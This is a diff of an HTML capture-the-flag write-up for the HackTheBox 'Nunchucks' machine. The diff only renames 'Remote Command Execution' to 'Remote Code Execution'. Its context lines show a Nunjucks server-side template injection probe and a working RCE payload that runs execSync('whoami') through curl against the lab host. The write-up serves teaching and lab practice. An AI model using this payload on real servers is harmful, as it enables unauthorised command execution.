@@ -122,7 +122,7 @@ $
 <a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/capabilities title=Capabilities>Capabilities</a>
 </li>
 <li class=list>
-<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Command Execution">Remote Command Execution</a>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Code Execution">Remote Code Execution</a>
 </li>
 <li class=list>
 <a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/ssti title="Server-Side Template Injection">Server-Side Template Injection</a>
@@ -225,7 +225,7 @@ ETag: W/&#34;fbd-udK+KYlYFVN2Nn2DXdm1EXd8mv0&#34;
 </code></pre></div><p>And see if it responds with <code>49</code>. Using the POST request in <code>curl</code>, we see that the payload works:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl https://store.nunchucks.htb/api/submit -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -kd <span style=color:#e6db74>&#39;{&#34;email&#34;:&#34;{{7*7}}&#34;}&#39;</span> 
 {&#34;response&#34;:&#34;You will receive updates on the following email address: 49.&#34;}
-</code></pre></div><p>Now we know it is vulnerable, we can look for malicious payloads to gain Remote Command Execution (RCE). The following payload can be found <a href=http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine>here</a>:</p>
+</code></pre></div><p>Now we know it is vulnerable, we can look for malicious payloads to gain Remote Code Execution (RCE). The following payload can be found <a href=http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine>here</a>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-django data-lang=django><span style=color:#75715e>{{</span>range.constructor<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;return global.process.mainModule.require(&#34;child_process&#34;).execSync(&#34;whoami&#34;)&#39;</span><span style=color:#f92672>)()</span><span style=color:#75715e>}}</span> 
 </code></pre></div><p>To use the payload in the <code>curl</code> command, we need to use a third type of quote because the payload is encapsulated into a JSON document. One solution is to use backticks (<code>`</code>), which is supported by JavaScript, and they must be escaped because we are in a shell environment (another solution could have been to escape or double-escape normal quotes):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl https://store.nunchucks.htb/api/submit -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -kd <span style=color:#e6db74>&#34;{\&#34;email\&#34;:\&#34;{{range.constructor(&#39;return global.process.mainModule.require(\`child_process\`).execSync(\`whoami\`)&#39;)()}}\&#34;}&#34;</span> 
